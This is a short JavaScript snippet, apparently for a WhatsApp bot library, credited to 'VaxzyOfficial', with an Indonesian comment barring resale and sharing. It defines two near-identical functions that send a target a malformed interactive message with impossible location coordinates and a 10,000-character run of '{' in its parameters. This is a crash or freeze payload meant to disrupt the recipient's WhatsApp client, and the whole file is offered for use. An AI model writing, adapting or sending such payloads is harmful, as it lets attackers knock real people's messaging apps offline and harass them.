//FUNC INI DI LARANG DI PERJUAL BELIKAN KHUSUS UNTUK PRIB NO SHARE KE PT NO SHARE FREE KETAHUAN? TERIMA KONSEKUENSI. Copyright: VaxzyOfficial

async function VerloadOneMsg(target) {
let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere💥",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: {
              text: "VaxzyIsHere💥",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await Dragon.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
//COMBOIN SAMA FUNC DI BAWAH INI
async function VerloadOneMsg(target) {
let msg = await generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyIsHere💥",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: {
              text: "VaxzyIsHere💥",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await Dragon.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}